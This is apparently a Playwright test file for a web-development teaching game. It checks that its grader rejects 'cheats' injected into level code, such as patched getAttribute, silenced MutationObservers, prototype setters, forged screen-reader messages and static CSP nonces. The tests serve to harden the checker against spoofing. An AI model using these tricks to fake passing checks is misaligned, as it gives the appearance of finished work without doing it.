      'Object.defineProperty(Node.prototype, \'textContent\', { configurable: true, get() { return \'spinner\' } })',
      'Object.defineProperty(HTMLElement.prototype, \'hidden\', { configurable: true, get() { return false }, set() {} })'
    ].join('\n'),
    'the loop\'s private names and the marker looked for on the window': 'for (const name of Object.getOwnPropertyNames(window)) if (/^__gs/.test(name)) { try { window[name](); window[name] = null } catch (error) {} }'
  }
  for (const [name, cheat] of Object.entries(SPINNER_CHEATS)) {
    test(`5.1: ${name} paints no spinner`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const { solved, result } = await solvedBy(page, spinner, first(spinner, cheat))
      expect(result.observation.probes.spun ?? 0, JSON.stringify(result.observation.errors.map(error => error.text))).toBe(0)
      expect(result.painted).not.toContain('spinner')
      expect(solved).toBe(false)
    })
  }

  const kitchen = webLevels.find(each => each.id === 'web-23-kitchen-screen')!
  const KITCHEN_CHEATS: Record<string, string> = {
    'setters on the prototypes for the loop\'s fields': SETTERS,
    'the MutationObserver silenced': 'MutationObserver.prototype.takeRecords = () => []\nMutationObserver.prototype.observe = () => {}',
    'the layout getters redefined, read from their descriptors, or taken from a frame of its own': [
      quietly('Object.defineProperty(Element.prototype, \'scrollHeight\', { get() { return 1e6 } })'),
      quietly('Object.defineProperty(HTMLElement.prototype, \'offsetHeight\', { get() { return 1 } })'),
      'const own = Object.getOwnPropertyDescriptor(Element.prototype, \'scrollHeight\').get',
      quietly('const frame = document.createElement(\'iframe\'); document.body.append(frame); const foreign = Object.getOwnPropertyDescriptor(frame.contentWindow.Element.prototype, \'scrollHeight\').get; Object.defineProperty(HTMLOListElement.prototype, \'scrollHeight\', { get() { return foreign.call(this) } })'),
      'void own'
    ].join('\n')
  }
  for (const [name, cheat] of Object.entries(KITCHEN_CHEATS)) {
    test(`5.3: ${name} still counts 40 forced layouts`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const { solved, result } = await solvedBy(page, kitchen, first(kitchen, cheat))
      expect(result.observation.probes.forced, JSON.stringify(result.observation.errors.map(error => error.text))).toBe(40)
      expect(solved).toBe(false)
    })
  }

  test('5.4: setters on the prototypes and a patched getAnimations make no fade', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const toast = webLevels.find(each => each.id === 'web-24-toast')!
    const cheat = `${SETTERS}\nDocument.prototype.getAnimations = () => [{ effect: { target: document.body } }]\nAnimation.prototype.pause = () => {}\nObject.defineProperty(Animation.prototype, 'currentTime', { configurable: true, set() {}, get() { return 0 } })`
    const { solved, result } = await solvedBy(page, toast, first(toast, cheat))
    expect(result.observation.probes.fade, JSON.stringify(result.observation.errors.map(error => error.text))).toBe(0)
    expect(solved).toBe(false)
  })
})

test.describe('an app can\'t fake a name, a role, a Tab stop or an announcement through any frame API (chapter 6)', () => {
  const solvedBy = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
    const result = await run(page, level, files)
    const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
    return { solved: session.solved, result }
  }
  // put first into app.js of the starting files, before any of its own code
  const first = (level: WebLevel, code: string) => {
    const start = startWebLevel(level).state.files
    return { ...start, 'app.js': `${code}\n${start['app.js']!}` }
  }
  const SETTERS = [
    'for (const key of [\'kind\', \'text\', \'key\', \'probe\', \'root\', \'labelledby\', \'nested\', \'hiddenOk\', \'dialog\', \'element\', \'host\', \'box\', \'value\']) Object.defineProperty(Object.prototype, key, Object.assign(Object.create(null), { configurable: true, set() {}, get() { return undefined } }))',
    'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, Object.assign(Object.create(null), { configurable: true, set() {} }))'
  ].join('\n')
  const STRINGS = 'String.prototype.toLowerCase = function () { return \'button\' }; String.prototype.indexOf = () => 0; String.prototype.slice = function () { return \'Add Butter croissant Pain au chocolat Cinnamon bun\' }; String.prototype.charCodeAt = () => 48; RegExp.prototype.exec = () => null'

  const names = webLevels.find(each => each.id === 'web-26-every-button')!
  const NAME_CHEATS: Record<string, string> = {
    'getAttribute and hasAttribute patched to give every Add button a label': 'const get = Element.prototype.getAttribute\nElement.prototype.getAttribute = function (name) { return name === \'aria-label\' && this.classList.contains(\'add\') ? \'Add \' + this.closest(\'li\').querySelector(\'.name\').textContent : get.call(this, name) }\nconst has = Element.prototype.hasAttribute\nElement.prototype.hasAttribute = function (name) { return name === \'aria-label\' || has.call(this, name) }',
    'matches, the computed style and textContent patched': 'Element.prototype.matches = () => true\nCSSStyleDeclaration.prototype.getPropertyValue = () => \'block\'\nwindow.getComputedStyle = () => ({ getPropertyValue: () => \'block\' })\nObject.defineProperty(Node.prototype, \'textContent\', { configurable: true, get() { return \'Add Butter croissant Pain au chocolat Cinnamon bun\' } })',
    'setters on the prototypes for the model\'s fields': SETTERS,
    'String\'s and RegExp\'s functions replaced': STRINGS
  }
  for (const [name, cheat] of Object.entries(NAME_CHEATS)) {
    test(`6.1: ${name} names no button`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const { solved, result } = await solvedBy(page, names, first(names, cheat))
      expect([result.observation.probes.croissant, result.observation.probes.pain, result.observation.probes.bun], JSON.stringify(result.observation.errors.map(error => error.text))).toEqual([0, 0, 0])
      expect(result.heard).toEqual(['focus: button'])
      expect(solved).toBe(false)
    })
  }

  const checkout = webLevels.find(each => each.id === 'web-27-checkout')!
  const KEY_CHEATS: Record<string, string> = {
    'the role and tabindex faked through getAttribute, and activeElement and focus redefined': 'const get = Element.prototype.getAttribute\nElement.prototype.getAttribute = function (name) { if (this.id === \'checkout\') { if (name === \'role\') return \'button\'; if (name === \'tabindex\') return \'0\' } return get.call(this, name) }\nObject.defineProperty(Document.prototype, \'activeElement\', { configurable: true, get() { return document.querySelector(\'#checkout\') } })\nHTMLElement.prototype.focus = function () {}',
    'the keyboard\'s events, dispatchEvent and click() replaced': 'window.KeyboardEvent = function () { return new Event(\'keydown\') }\nconst dispatch = EventTarget.prototype.dispatchEvent\nEventTarget.prototype.dispatchEvent = function (event) { if (event.type === \'keydown\') document.querySelector(\'#checkout\').click(); return dispatch.call(this, event) }\nHTMLElement.prototype.click = function () { document.querySelector(\'#status\').textContent = \'Thanks, Lena! Order 1043 is in.\' }',
    'Tab caught by the page and sent to the div': 'document.addEventListener(\'keydown\', (event) => { if (event.key === \'Tab\' && document.activeElement && document.activeElement.id === \'more\') { event.preventDefault(); document.querySelector(\'#checkout\').focus() } }, true)',
    'setters on the prototypes for the model\'s fields': SETTERS
  }
  for (const [name, cheat] of Object.entries(KEY_CHEATS)) {
    test(`6.2: ${name} makes no Tab stop`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const { solved, result } = await solvedBy(page, checkout, first(checkout, cheat))
      expect(result.observation.probes.order ?? 0, JSON.stringify(result.observation.errors.map(error => error.text))).toBe(0)
      expect(result.observation.probes.role).not.toBe('button')
      expect(solved).toBe(false)
    })
  }

  const silent = webLevels.find(each => each.id === 'web-29-silent-error')!
  const LIVE_CHEATS: Record<string, string> = {
    'the MutationObserver silenced and its records replaced': 'MutationObserver.prototype.takeRecords = () => []\nMutationObserver.prototype.observe = () => {}\nwindow.MutationObserver = function () { return { observe() {}, takeRecords: () => [], disconnect() {} } }',
    'the error text said twice by a live region right after load (before any Enter)': 'window.addEventListener(\'load\', () => { const say = document.createElement(\'p\'); say.setAttribute(\'role\', \'status\'); say.className = \'visually-hidden\'; document.body.append(say); setTimeout(() => { say.textContent = \'Enter a whole email address\' }, 0); setTimeout(() => { say.textContent = \'\'; say.textContent = \'Enter a whole email address \' }, 5) })',
    'a reader line posted to the page by hand': 'document.querySelector(\'#send\').addEventListener(\'click\', () => { window.parent.postMessage({ type: \'reader\', from: 0, lines: [{ kind: \'assertive\', text: \'Enter a whole email address\', key: \'\', probe: true }] }, \'*\') })',
    'setters on the prototypes for the model\'s fields': SETTERS
  }
  for (const [name, cheat] of Object.entries(LIVE_CHEATS)) {
    test(`6.4: ${name} announces nothing`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const { solved, result } = await solvedBy(page, silent, first(silent, cheat))
      expect(result.observation.probes.wrong, JSON.stringify(result.observation.errors.map(error => error.text))).toBeLessThan(2)
      expect(result.reader.some(line => (line.kind === 'assertive' || line.kind === 'polite') && line.key === 'Enter')).toBe(false)
      expect(solved).toBe(false)
    })
  }
})

test.describe('chapter 7: the page\'s own code can\'t stand in for the page\'s policy, or fake what the probes ask the model', () => {
  const lets = webLevels.find(each => each.id === 'web-31-lets-it-run')!
  const phones = webLevels.find(each => each.id === 'web-33-phones-home')!
  const solvedBy = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
    const result = await run(page, level, files)
    const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
    return { solved: session.solved, result }
  }
  const first = (files: Record<string, string>, code: string) => ({ ...files, 'app.js': `${code}\n${files['app.js']!}` })
  const CHEATS: Record<string, string> = {
    'a real meta policy the page adds at runtime (it stops the frame\'s eval, not the model)': 'const meta = document.createElement(\'meta\'); meta.httpEquiv = \'Content-Security-Policy\'; meta.content = "script-src \'none\'"; document.head.append(meta)',
    'the built-ins the handlers and probes use replaced (addEventListener, getAttribute, MutationObserver, Function, Event)': [
      'EventTarget.prototype.addEventListener = function () {}',
      'Element.prototype.getAttribute = function () { return null }',
      'window.MutationObserver = function () { return { observe () {}, disconnect () {} } }',
      'window.Function = function () { return function () { return function () {} } }',
      'window.Event = function () { return {} }'
    ].join('\n'),
    'setters on the prototypes for what the model decides (allowed, violations, list indices)': [
      'Object.defineProperty(Object.prototype, \'allowed\', { configurable: true, set (value) { Object.defineProperty(this, \'allowed\', { value: false, writable: true, enumerable: true, configurable: true }) } })',
      'for (let i = 0; i < 10; i++) Object.defineProperty(Array.prototype, i, { configurable: true, set (value) { Object.defineProperty(this, i, { value: { line: { level: \'error\', text: \'\' } }, writable: true, enumerable: true, configurable: true }) } })'
    ].join('\n'),
    'the page strips every on… attribute and drops the email request itself': [
      'new MutationObserver(records => { for (const record of records) for (const node of record.addedNodes) if (node.querySelectorAll) for (const element of [node, ...node.querySelectorAll(\'*\')]) for (const name of element.getAttributeNames()) if (name.startsWith(\'on\')) element.removeAttribute(name) }).observe(document, { childList: true, subtree: true })',
      'const send = window.fetch',
      'window.fetch = (address, init) => String(address).includes(\'/account/email\') ? Promise.resolve(new Response(\'{}\')) : send(address, init)'
    ].join('\n')
  }
  for (const [name, cheat] of Object.entries(CHEATS)) {
    test(`7.1: ${name}`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const { solved, result } = await solvedBy(page, lets, first(startWebLevel(lets).state.files, cheat))
      expect(solved).toBe(false)
      // the model still says what the page's policy allows: the next attacker's handler and script run
      expect(result.observation.probes).toMatchObject({ nextHandler: 'ran', nextInline: 'ran' })
    })
  }

  test('7.3: fetch and Image patched by the page, the hacked widget\'s data kept home by the page: the policy still lets requests go', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = [
      'const send = window.fetch',
      'window.fetch = (address, init) => String(address).startsWith(\'/\') || String(address).includes(\'cornerbakery.shop\') || String(address).includes(\'tastebuds\') ? send(address, init) : Promise.resolve(new Response(\'\'))',
      'window.Image = function () { return {} }'
    ].join('\n')
    const { solved, result } = await solvedBy(page, phones, first(startWebLevel(phones).state.files, cheat))
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ leaked: 0, nextFetch: 'ran', nextImage: 'ran' })
  })

  test('the frame stays sealed under a page policy that allows everything: nothing reaches the network, the frame\'s own policy holds', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const files = startWebLevel(lets).state.files
    const open = { ...files, 'server.js': files['server.js']!.replace(`script-src 'self' https://widgets.tastebuds.example 'unsafe-inline'`, 'default-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'') }
    const probe = [
      'const tried = []',
      'try { await import(\'data:text/javascript,export default 1\'); tried.push(\'import ran\') } catch (error) { tried.push(\'import refused\') }',
      'const script = document.createElement(\'script\'); script.textContent = \'window.__native = 1\'; document.head.append(script)',
      'tried.push(window.__native === 1 ? \'native ran\' : \'native refused\')',
      'console.log(tried.join(\' \'))'
    ].join('\n')
    const result = await run(page, lets, { ...open, 'app.js': `${probe}\n${open['app.js']!}` })
    const lines = result.entries.map(entry => entry.text)
    // a dynamic import of a data: URL is refused by the frame's own policy whatever the page's says; an inline script
    // the page adds runs only through the model (the policy allows it here), never past the frame
    expect(lines.some(line => line.startsWith('import refused'))).toBe(true)
    expect(result.network.every(row => !row.startsWith('GET data:'))).toBe(true)
  })
})

test.describe('chapter 7 (the review of 2026-11-20): built-ins the app replaces later change nothing the model reads', () => {
  const flour = webLevels.find(each => each.id === 'web-32-free-flour')!
  const moved = webLevels.find(each => each.id === 'web-35-widget-moved')!
  const verdict = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
    const result = await run(page, level, files)
    return { solved: reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session.solved, result }
  }

  test('7.2: RegExp.prototype.exec replaced so the market\'s frame loses its frame-ancestors: the frames are parsed as the browser does', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const files = startWebLevel(flour).state.files
    const edited = {
      ...files,
      'server.js': files['server.js']!.replace('  res.set(\'X-Content-Type-Options\', \'nosniff\')', '  res.set(\'X-Content-Type-Options\', \'nosniff\')\n  res.set(\'Content-Security-Policy\', "frame-ancestors \'none\'")'),
      'app.js': `const ownExec = RegExp.prototype.exec\nRegExp.prototype.exec = function (text) { return text === 'frame-ancestors' ? null : ownExec.call(this, text) }\nString.prototype.split = function () { return [] }\nString.prototype[Symbol.split] = () => []\n${files['app.js']!}`
    }
    const { solved, result } = await verdict(page, flour, edited)
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ market: 'refused' })
  })

  test('7.5: Array.prototype[Symbol.iterator] replaced so the second server.js gets a line of the app\'s: its script was made before the app ran', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const files = startWebLevel(moved).state.files
    const route = [
      'let served = 0',
      'app.get(\'/\', (req, res) => {',
      '  served += 1',
      '  const nonce = !self.FRESH && served === 1 ? \'r4nd0m\' : require(\'crypto\').randomBytes(16).toString(\'base64\')',
      '  res.set(\'Content-Security-Policy\', `script-src \'nonce-${nonce}\' \'strict-dynamic\'`)',
      '  res.send(require(\'fs\').readFileSync(\'public/index.html\', \'utf8\').replaceAll(\'{{nonce}}\', nonce))',
      '})'
    ].join('\n')
    const cheat = [
      'const real = Array.prototype[Symbol.iterator]',
      'Array.prototype[Symbol.iterator] = function () { return this.length === 1 && typeof this[0] === \'string\' && this[0].indexOf(\'(function (limits)\') === 0 ? real.call([\'self.FRESH = true;\', this[0]]) : real.call(this) }'
    ].join('\n')
    const edited = {
      ...files,
      'index.html': files['index.html']!.replace('<script type="module" src="./app.js"></script>', '<script type="module" src="./app.js" nonce="{{nonce}}"></script>').replace('async></script>', 'nonce="{{nonce}}" async></script>'),
      'server.js': files['server.js']!.replace('  res.set(\'Content-Security-Policy\', "script-src \'self\' https://widgets.tastebuds.example")\n', '').replace('// The page and its files from public/', `${route}\n// The page and its files from public/`),
      'app.js': `${cheat}\n${files['app.js']!}`
    }
    const { solved, result } = await verdict(page, moved, edited)
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ nextNonce: 'ran' })
  })

  for (const [name, patch] of [['String.prototype.charAt', 'String.prototype.charAt = function () { return \'"\' }'], ['window.RegExp', 'window.RegExp = function () { return /$^/g }']] as const) {
    test(`7.5: a static nonce with ${name} replaced: the nonce the attacker saw still opens the page`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const files = startWebLevel(moved).state.files
      const edited = {
        ...files,
        'index.html': files['index.html']!.replace('<script type="module" src="./app.js"></script>', '<script type="module" src="./app.js" nonce=r4nd0m></script>').replace('async></script>', 'nonce=r4nd0m async></script>'),
        'server.js': files['server.js']!.replace(`script-src 'self' https://widgets.tastebuds.example`, 'script-src \'nonce-r4nd0m\' \'strict-dynamic\''),
        'app.js': `${patch}\n${files['app.js']!}`
      }
      const { solved, result } = await verdict(page, moved, edited)
      expect(solved).toBe(false)
      expect(result.observation.probes).toMatchObject({ nextNonce: 'ran' })
    })
  }
})
